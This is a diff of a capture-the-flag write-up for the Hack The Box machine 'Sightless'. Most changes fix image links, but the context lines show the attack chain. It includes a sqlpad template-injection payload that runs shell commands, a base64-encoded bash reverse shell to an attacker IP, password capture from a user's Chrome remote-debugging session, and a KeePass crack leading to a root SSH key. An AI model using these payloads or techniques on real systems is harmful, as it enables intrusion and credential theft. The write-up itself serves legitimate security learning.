@@ -71,17 +71,12 @@ We'll need to come back whenever we have credentials for this service.
 
 ## Web
 Port 80 is open, and as nmap said is delivering web content. Accessing it returns a redirect to `sightless.htb`. After adding it to my `/etc/hosts` file, let's access it with firefox :
-![[web.png]]
+![web.png](/assets/img/sightless/web.png)
 It's a really simple web page, none of the buttons work. I could try to bruteforce directories but this is not the way here. There's a link at the bottom mentionning a subdomain, `sqlpad.sightless.htb`.
 
 ## sqlpad.sightless.htb
 Going to sqlpad.sightless.htb gives us access to a simple sqlpad interface : 
-![sqlpad.png](sqlpad.png)
-a
-![sqlpad.png](/img/sightless/sqlpad.png)
-b
 ![sqlpad.png](/assets/img/sightless/sqlpad.png)
-c
 This is the right time to keep in mind that this is an easy box. Where on an insane/hard, we would probably have to understand a lot about how sqlpad works, this is not the case here. In fact we are on google search away from getting a shell. The website displays `sqlpad version 6.10.0`. Googling sqlpad exploit leads to [this post](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb), which describes a vulnerability affecting all sqlpad instance for versions prior to 6.10.1. The payload is the following :
 ```python
 {{ process.mainModule.require('child_process').exec('id>/tmp/pwn') }}
@@ -92,7 +87,7 @@ To get a shell from it, I'll use the standard bash reverse shell, and base64 enc
 {{ process.mainModule.require('child_process').exec('echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDEvMjIyMiAwPiYx |base64 -d|bash') }}
 ```
 Now I follow the blog post describing the exploit, I create a new connection using the MySQL driver, and put my payload as the database :
-![[editconnectionsqlpad.png]]
+![editconnectionsqlpad.png](/assets/img/sightless/)
 When I click on save, I do get a shell on my nc listener :
 ```terminal
 ┌──(samsam㉿pika-pika)-[~/htb/sightless]
@@ -195,17 +190,18 @@ michael@sightless:~$ curl http://127.0.0.1:38983/json
    "webSocketDebuggerUrl": "ws://127.0.0.1:38983/devtools/page/808BE4E06885A551AAB634E133D0410F"
 } ]
 ```
-Ports 46013 and 37871 returned some strange stuff, however 38983 returned the expected json ! We can interact with this chrome session by many different ways, one of which is the chrome developper tools. To find out what I could do with this remote debugging chrome browser that john runs, I used a lot of google and found [this tutorial](https://developer.chrome.com/docs/devtools/remote-debugging/local-server) I can actually have access to his browser in real time ! A lot of steps are incoming, so don't worry if it's not quite clear I'll sum it up at the end.
+Ports 46013 and 37871 returned some strange stuff, however 38983 returned the expected json ! We can interact with this chrome session by many different ways, one of which is the chrome developper tools. To find out what I could do with this remote debugging chrome browser that john runs, I used a lot of google and found [this tutorial](https://developer.chrome.com/docs/devtools/remote-debugging/local-server). 
+I can actually have access to his browser in real time ! A lot of steps are incoming, so don't worry if it's not quite clear I'll sum it up at the end.
 I'll install chrome on my machine first. Then, I need to be able to access the port 37871, which for now is only accessible from the machine sightless.htb. To get access to it, I'll use ssh to forward the port :
 `ssh -L 7070:127.0.0.1:38983 michael@sightless.htb`
 Now, the port 38983 of the box, listening only on 127.0.0.1, is accessible through the port 7070 of my machine ;) I'll follow the previously linked tutorial and add a new target in chrome://inspect/#devices :
-![[chrom_add_config.png]]
+![chrom_add_config.png](/assets/img/sightless/chrom_add_config.png)
 Then, a new target appears, meaning that it worked :
-![[connect_chrome.png]]
-When clicking on inspect, I get a live view of john's browser !! ![[john_login.gif]]
+![connect_chrome.png](/assets/img/sightless/connect_chrome.png)
+When clicking on inspect, I get a live view of john's browser !! ![john_login.gif](/assets/img/sightless/john_login.gif)
 He is connecting to a froxlor instance, typing his username and password, then logs out after a few seconds. I absolutely love it, I've never seen something like that in a ctf. 
 So going back to exploitation, since he is typing his password we can actually intercept it, in the inspect pane there is a network tab. I'll log the login request, and stop the recording to check what was sent :
-![[intercept.gif]]
+![intercept.gif](/assets/img/sightless/intercept.gif)
 And we have the admin password,`ForlorfroxAdmin` for the webapp Froxlor ! 
 
 To sum up what we have done :
@@ -216,7 +212,7 @@ John was accessing admin.sightless.htb:8080, which matches what we saw earlier w
 `ssh -L 7070:127.0.0.1:8080 michael@sightless.htb`
 Now if I open firefox and type in 127.0.0.1:7070 I'll have access to the froxlor instance running on port 8080 of sightless.htb. I now have the credentials and can log in the webapp. 
 After digging around for a bit, in `Resources -> Domains` theres a new domain, `web1.sightless.htb`. Interestingly, clicking on the web1 username opens the admin pannel of that customer. The FTP tab on the left allows me to reset the ftp password !
-![[ftpreset.png]]
+![ftpreset.png](/assets/img/sightless/ftpreset.png)
 I'll just copy paste the password suggestion, hit save, and try to connect to the ftp server :
 ```terminal
 ┌──(samsam㉿pika-pika)-[~/htb/sightless]
@@ -254,9 +250,9 @@ Session completed.
 ```
 The password is bulldogs. This is getting quite long for an easy box, but hey we are almost done !
 I'll import it in `keepassxc`, making sure to use import file, because this is a .kdb file meaning it's using KeePass 1.X :
-![[keepass_import.png]]
+![keepass_import.png](/assets/img/sightless/keepass_import.png)
 The database only has one entry, Username : root Password : q6gnLTB74L132TMdFCpK However it doesn't work on ssh nor when I `su root`. And `id_rsa` file is attached, and I can save it !
-![[keepass_attachment.png]]
+![keepass_attachment.png](/assets/img/sightless/keepass_attachment.png)
 ```terminal
 ┌──(samsam㉿pika-pika)-[~/htb/sightless]
 └─$ ssh root@sightless.htb -i id_rsa         
